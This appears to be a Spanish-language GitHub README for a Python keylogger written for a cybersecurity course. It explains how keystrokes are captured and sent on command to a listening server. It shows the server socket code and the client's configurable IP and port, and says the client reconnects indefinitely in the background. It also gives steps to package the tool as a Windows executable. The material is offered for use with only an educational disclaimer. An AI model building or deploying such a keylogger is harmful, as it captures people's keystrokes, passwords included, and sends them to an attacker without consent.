# Keylogger simple

----
Mi user github: https://github.com/desmonHak/
----

Este es un pequeño keylogger simple hecho en python para mi asignatura de ciberseguridad en DAM2.

El keylogger contiene dos hilos, el primero se encarga de gestionar el tema del teclado, mientras que el segundo permite al kelogger conectarse contra un servidor, este podra lanzar comandos al keylogger para que le envie el .log(las teclas pulsadas). 

Este codigo no tiene ningun fin mas que educativo y ser una muestra del funcionamiento de este tipo de malware.

----

## instalacion de dependencias

para instalar las dependencias deberemos ejecutar lo siguiente:
```
pip install -r requirements.txt
```

----

### Descripcion del proyecto

El proyecto contiene dos scripts, `main.py` es el keylogger como tal, el segundo
script, `tools.py` es una pequeña utilidad que hice para leer el archivo de
log de forma correcta. Tambien tiene una segunda opcion que permite abrir un
servicio multihilo en local:
```python
def create_server():
    global _all_threads
    s = socket()
    s.bind(("0.0.0.0", 8888))
    s.listen(10)

    print("Servidor escuchando en 0.0.0.0:8888")
    conn, addr = s.accept()
    print(f"Conexion desde {addr}")
    t = Thread(target=handle_client, args=(conn, addr), daemon=True)
    t.start()
    _all_threads.append(t)
    try: t.join()
    except Exception as e:
        print("Error en el hilo:", e)
    return t
```

puede configurar el puerto cambiando el `8888` por el que quiera.
Este pequeño servidor sirve para que el keylogger se conecte y envie el log,
el servidor puede enviar un comando `getlog` solicitando el log, y el cliente
(keylogger) enviara un buffer dinamico que sera el log con las teclas.
En caso de que el servidor se cierre, el keylogger seguira funcionando de fondo,
podra reabrir otro servidor y el keylogger reintentara la conexion de forma
indefinida en intervalos de 1s.

Puede configurar el keylogger para que se conecte a la IP que usted quiera:
```python
if __name__ == "__main__":
    try:
        keys = Keylogger(
            "127.0.0.1", 8888)
        keys.thread_kewyboard.start()
        keys.thread_client.start()
        keys.thread_kewyboard.join()
    except KeyboardInterrupt:
        pass
    print_debug("Hilo keyboard listener terminado")
    exit(0)
```
Debera cambiar `127.0.0.1` y `8888` por la IP y puerto que quiera usar, como 
es para fines de demostracion las pruebas se realizaron en local.

El keylogger se puede finalizar usando la tecla escape(``esc``) y podra decirle
al keylogger que guarde el log al pulsar la tecla `f1`.

El keylogger esta configurado para que cada 4 pulsaciones de teclas, se auto-almacene
todo en el archivo log, pero puede cambiar esto en la variable `counter_keywords`.

----

## Generar ejecutable

Una vez instalada las dependencias, ejecutamos el archivo `build.bat` via
`cmd` o doble click, y deberia generar un ejecutable `key.exe`

----
